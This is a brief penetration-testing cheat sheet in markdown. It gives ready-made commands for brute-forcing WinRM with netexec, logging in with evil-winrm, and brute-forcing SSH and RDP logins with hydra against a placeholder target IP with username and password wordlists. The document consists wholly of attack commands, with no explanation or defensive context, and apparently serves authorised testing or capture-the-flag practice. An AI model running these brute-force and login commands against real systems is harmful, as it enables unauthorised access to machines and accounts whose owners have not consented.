
## WinRM Exploitation

### Bruteforce Attack WinRM

```bash
netexec winrm <TARGET IP> -u <username/user wordlist> -p <password/password wordlist>
```

### Login WinRM

```bash
evil-winrm -i <TARGET IP> -u <username> -p <password>
```


## SSH Exploitation

### Bruteforce Attack SSH

```bash
hydra -L <username/user wordlist> -P <password/password wordlist> ssh://<TARGET IP>
```


## RDP Exploitation

### Bruteforce Attack RDP

```bash
hydra -L <username/user wordlist> -P <password/password wordlist> rdp://<TARGET IP>
```